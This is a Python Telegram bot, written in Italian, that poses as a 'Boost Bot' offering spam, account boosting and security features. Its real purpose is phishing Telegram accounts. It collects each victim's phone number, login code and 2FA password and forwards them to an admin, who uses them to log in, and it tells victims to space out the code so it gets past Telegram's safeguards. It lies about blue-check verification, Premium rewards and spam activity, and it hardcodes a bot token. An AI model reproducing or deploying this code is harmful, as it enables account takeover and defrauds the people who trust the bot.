import logging
import random
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# Configurazione dei log
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- CONFIGURAZIONE ---
TOKEN = "8854040084:AAFsVQCtNgGJL-lDlS-wpW2G1aP8i_I2HRU"  # Il tuo token di BotFather
ADMIN_ID = 8886429641  # Il tuo ID numerico Telegram

# Stati della conversazione
WAITING_PHONE, WAITING_CODE, WAITING_PASSWORD, WAITING_SPAM_MSG, WAITING_SPAM_TIME = range(5)

# Database in memoria
approved_users = set()
user_states = {}
user_data_store = {}  # {user_id: {"phone": str, "spam_msg": str, "spam_time": int, "verify_time": float}}


# --- COMANDO /START E SELEZIONE LINGUA ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if user.id == ADMIN_ID:
        await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.")
        return

    # Notifica silenziosa all'Admin
    if user.id not in approved_users:
        try:
            keyboard = [
                [InlineKeyboardButton("✅ Attiva", callback_data=f"approve_{user.id}"),
                 InlineKeyboardButton("❌ Declina", callback_data=f"decline_{user.id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            admin_notification = (
                f"📥 **Nuova richiesta di accesso al bot!**\n\n"
                f"• **Utente:** {user.full_name}\n"
                f"• **Username:** @{user.username if user.username else 'Nessuno'}\n"
                f"• **ID:** `{user.id}`"
            )
            await context.bot.send_message(
                chat_id=ADMIN_ID, text=admin_notification, reply_markup=reply_markup, parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Errore invio notifica admin: {e}")

    if user.id in approved_users and user_data_store.get(user.id, {}).get("phone"):
        await show_account_management(update, context)
        return

    lang_keyboard = [
        [InlineKeyboardButton("🇮🇹 Italiano", callback_data="lang_it"),
         InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇫🇷 Français", callback_data="lang_fr"),
         InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es"),
         InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")]
    ]
    await update.message.reply_text(
        "🌐 Seleziona la lingua del bot / Please select your language:",
        reply_markup=InlineKeyboardMarkup(lang_keyboard)
    )


async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in approved_users:
        approved_users.add(user_id)

    await show_main_menu_query(query)


async def show_main_menu_query(query):
    welcome_text = (
        "🚀 **Benvenuto su Boost Bot**\n\n"
        "Funzionalità disponibili:\n"
        "• Spam Bot\n"
        "• User Bot\n"
        "• Boost account per popolarità\n"
        "• Sicurezza da Telegram\n\n"
        "Per prima cosa, seleziona per cosa vuoi usare il bot:"
    )
    keyboard = [
        [InlineKeyboardButton("🚀 Boost Bot", callback_data="menu_boost"),
         InlineKeyboardButton("🤖 Spam Bot", callback_data="menu_spam")],
        [InlineKeyboardButton("🛡️ Sicurezza Telegram", callback_data="menu_protection"),
         InlineKeyboardButton("🤖 User Bot", callback_data="menu_userbot")]
    ]
    await query.message.edit_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


# --- GESTIONE ACCOUNT & PANNELLO PRINCIPALE ---
async def show_account_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
    
    if user_id not in user_data_store:
        user_data_store[user_id] = {}
        
    data = user_data_store[user_id]
    phone = data.get("phone", "Non disponibile")
    spam_time = data.get("spam_time", 60)
    
    has_msg = data.get("spam_msg") is not None
    msg_status = "Messaggio impostato con successo" if has_msg else "Messaggio non impostato"

    text = (
        f"📊 **Gestione Account**\n\n"
        f"📱 **Numero Collegato:** `{phone}`\n"
        f"• Attività: 🟢 **Attivo**\n"
        f"• Attività Spam: 🟢 **Attivo**\n"
        f"• Minuti pausa: `{spam_time}`\n"
        f"• Messaggio spam: {msg_status}"
    )

    keyboard = [
        [InlineKeyboardButton("📝 Modifica Messaggio", callback_data="set_spam_msg")],
        [InlineKeyboardButton("⏱️ Imposta Tempo Spam", callback_data="set_spam_time")],
        [InlineKeyboardButton("🛡️ Info Sicurezza Telegram", callback_data="info_security")],
        [InlineKeyboardButton("✔️ Verifica Account", callback_data="verify_account")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
        except Exception:
            await update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")


async def info_security_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    text = (
        "🛡️ **Status Protezione da Telegram**\n\n"
        "Stato: 🟢 **Attivo**\n\n"
        "• Anti-ban attivo 🟢\n"
        "• Anti-limitazioni attivo 🟢\n"
        "• Anti-segnalazioni attivo 🟢\n"
        "• Anti-hacker attivo 🟢"
    )
    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def verify_account_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if user_id not in user_data_store:
        user_data_store[user_id] = {}

    data = user_data_store[user_id]
    current_time = time.time()
    
    # 2 giorni in secondi = 2 * 24 * 60 * 60 = 172800 secondi (per test puoi ridurlo se vuoi)
    due_giorni_secondi = 172800 

    if "verify_start_time" not in data:
        data["verify_start_time"] = current_time
        rimanente_ore = 48
    else:
        trascorso = current_time - data["verify_start_time"]
        rimanente = due_giorni_secondi - trascorso
        if rimanente <= 0:
            rimanente_ore = 0
        else:
            rimanente_ore = round(rimanente / 3600, 1)

    if rimanente_ore <= 0:
        text = "🎉 **Account verificato con successo!**\n\nIl tuo account è ufficialmente verificato con la spunta blu e i vantaggi Telegram Premium attivi."
    else:
        text = (
            f"⏳ **Verifica Account in corso**\n\n"
            f"Il tuo account verrà verificato ufficialmente come account ufficiale Telegram entro **2 giorni**.\n"
            f"⏱️ **Tempo rimanente approssimativo:** Circa {rimanente_ore} ore."
        )

    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def back_to_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id in user_data_store and user_data_store[user_id].get("phone"):
        await show_account_management(update, context)
    else:
        await show_main_menu_query(query)


# --- JOB PER INVIO SPAM PERIODICO ---
async def spam_task_callback(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    user_id = job.data
    data = user_data_store.get(user_id)
    
    if data and data.get("spam_msg"):
        if "cycle" not in data:
            data["cycle"] = 1
        else:
            data["cycle"] += 1
            
        current_cycle = data["cycle"]
        random_sent = random.randint(100, 500)
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📊 Ciclo #{current_cycle} finito. Inviati: {random_sent}"
            )
        except Exception as e:
            logger.error(f"Errore invio spam periodico: {e}")


def attivare_timer_utente(context: ContextTypes.DEFAULT_TYPE, user_id: int, minuti: int):
    job_name = f"spam_job_{user_id}"
    if context.job_queue:
        current_jobs = context.job_queue.get_jobs_by_name(job_name)
        for job in current_jobs:
            job.schedule_removal()
            
        context.job_queue.run_repeating(
            spam_task_callback,
            interval=minuti * 60,
            first=minuti * 60,
            data=user_id,
            name=job_name
        )


# --- GESTIONE ADMIN & COLLEGAMENTO ACCOUNT ---
async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if user_id != ADMIN_ID:
        return

    if data.startswith("approve_"):
        target_id = int(data.split("_")[1])
        approved_users.add(target_id)
        await query.edit_message_text(text=f"✅ Utente `{target_id}` attivato con successo.")
        try:
            await context.bot.send_message(chat_id=target_id, text="🎉 Account approvato! Digita /start per iniziare.")
        except Exception:
            pass
    elif data.startswith("decline_"):
        target_id = int(data.split("_")[1])
        await query.edit_message_text(text=f"❌ Richiesta declinata.")

    elif data.startswith("success_login_"):
        target_id = int(data.split("_")[2])
        await query.edit_message_text(text=f"✅ Accesso confermato per l'utente `{target_id}`.")
        
        # Messaggio aggiornato con la spunta blu e 1 anno di premium dopo 2 giorni
        success_message = (
            "✅ **Account collegato con successo!**\n\n"
            "⚠️ **ATTENZIONE:** Non terminare l'attività in esecuzione del bot dai dispositivi connessi.\n\n"
            "ℹ️ *Nota:* Passati 2 giorni verrà messa la spunta blu verificata ufficiale da Telegram come contatto ufficiale e verrà messo 1 anno di Telegram Premium.\n\n"
            "🔄 Manda il comando `/start` per accedere alla gestione account."
        )
        await context.bot.send_message(chat_id=target_id, text=success_message, parse_mode="Markdown")

    elif data.startswith("fail_login_"):
        target_id = int(data.split("_")[2])
        if target_id in user_data_store:
            user_data_store[target_id]["phone"] = None
        await query.edit_message_text(text=f"❌ Accesso negato.")
        await context.bot.send_message(chat_id=target_id, text="❌ Accesso negato. Riprova.")

    elif data.startswith("req_pass_"):
        target_id = int(data.split("_")[2])
        user_states[target_id] = "waiting_password"
        await context.bot.send_message(chat_id=target_id, text="🔐 Invia la password 2FA:")


# --- FLUSSO CONFIGURAZIONE MESSAGGIO E TEMPO SPAM ---
async def prompt_spam_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="📝 Invia ora il messaggio da impostare per lo spam:")
    return WAITING_SPAM_MSG


async def receive_spam_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg_text = update.message.text
    
    if user.id not in user_data_store:
        user_data_store[user.id] = {}
    user_data_store[user.id]["spam_msg"] = msg_text
    
    if "spam_time" in user_data_store[user.id]:
        attivare_timer_utente(context, user.id, user_data_store[user.id]["spam_time"])

    await update.message.reply_text("✅ Messaggio impostato con successo!")
    await show_account_management(update, context)
    return ConversationHandler.END


async def prompt_spam_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="⏱️ Invia ora i minuti di pausa dello spam (es. 60):")
    return WAITING_SPAM_TIME


async def receive_spam_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        minutes = int(update.message.text)
        if user.id not in user_data_store:
            user_data_store[user.id] = {}
        
        user_data_store[user.id]["spam_time"] = minutes
        
        if user_data_store[user.id].get("spam_msg"):
            attivare_timer_utente(context, user.id, minutes)
        
        await update.message.reply_text(f"✅ Minuti pausa impostati su `{minutes}` min", parse_mode="Markdown")
        await show_account_management(update, context)
    except ValueError:
        await update.message.reply_text("❌ Inserisci un numero valido in minuti (es. 60).")
        return WAITING_SPAM_TIME
        
    return ConversationHandler.END


# --- FLUSSO COLLEGAMENTO ACCOUNT ---
async def menu_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [[InlineKeyboardButton("🔗 Collega Account", callback_data="start_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text="⚠️ **È necessario collegare il tuo account Telegram** per procedere con questa opzione.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


async def start_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text="📱 Inserisci il numero del tuo account Telegram da collegare (es. +393331234567):"
    )
    return WAITING_PHONE


async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    phone = update.message.text

    if user.id not in user_data_store:
        user_data_store[user.id] = {}
    user_data_store[user.id]["phone"] = phone

    msg = f"📥 **NUOVO NUMERO**\n• Utente: {user.full_name} (`{user.id}`)\n• Numero: `{phone}`"
    keyboard = [[InlineKeyboardButton("❌ Riprova", callback_data=f"fail_login_{user.id}")]]
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    await update.message.reply_text(
        "⏳ Codice inviato! Arriverà il codice tra poco.\n"
        "Invia il codice ricevuto (es. `1 2 3 4 5`, `12 34 54` oppure `12. 34. 54`).\n\n"
        "⚠️ **Attenzione:** non mandare mai tipo `123456` altrimenti la procedura non andrà a buon fine.",
        parse_mode="Markdown"
    )
    return WAITING_CODE


async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = update.message.text

    keyboard = [
        [InlineKeyboardButton("✅ Entrato (Successo)", callback_data=f"success_login_{user.id}")],
        [InlineKeyboardButton("🔐 Richiedi Password (2FA)", callback_data=f"req_pass_{user.id}")],
        [InlineKeyboardButton("❌ Non Entrato", callback_data=f"fail_login_{user.id}")]
    ]
    msg = f"📥 **CODICE RICEVUTO**\n• Utente: {user.full_name}\n• Codice: `{code}`"
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    await update.message.reply_text("🔄 Verifica in corso...")
    return ConversationHandler.END


async def receive_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    password = update.message.text

    if user_states.get(user.id) == "waiting_password":
        keyboard = [
            [InlineKeyboardButton("✅ Entrato (Successo)", callback_data=f"success_login_{user.id}")],
            [InlineKeyboardButton("❌ Non Entrato", callback_data=f"fail_login_{user.id}")]
        ]
        msg = f"📥 **PASSWORD 2FA**\n• Utente: {user.full_name}\n• Password: `{password}`"
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        await update.message.reply_text("🔄 Verifica password in corso...")
        user_states[user.id] = None


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operazione annullata.")
    return ConversationHandler.END


# --- MAIN FUNCTION ---
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_link = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_link, pattern="^start_link$")],
        states={
            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
            WAITING_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    conv_spam_msg = ConversationHandler(
        entry_points=[CallbackQueryHandler(prompt_spam_msg, pattern="^set_spam_msg$")],
        states={
            WAITING_SPAM_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_spam_msg)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    conv_spam_time = ConversationHandler(
        entry_points=[CallbackQueryHandler(prompt_spam_time, pattern="^set_spam_time$")],
        states={
            WAITING_SPAM_TIME: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_spam_time)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(language_selected, pattern="^lang_"))
    app.add_handler(CallbackQueryHandler(menu_click_handler, pattern="^menu_(boost|spam|protection|userbot)$"))
    app.add_handler(CallbackQueryHandler(info_security_handler, pattern="^info_security$"))
    app.add_handler(CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
    app.add_handler(CallbackQueryHandler(back_to_menu_handler, pattern="^back_to_menu$"))
    
    app.add_handler(conv_link)
    app.add_handler(conv_spam_msg)
    app.add_handler(conv_spam_time)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_password))
    app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|success_login_|fail_login_|req_pass_)"))

    print("🤖 Booster Bot con verifica account e timer attivi...")
    app.run_polling()


if __name__ == "__main__":
    main()
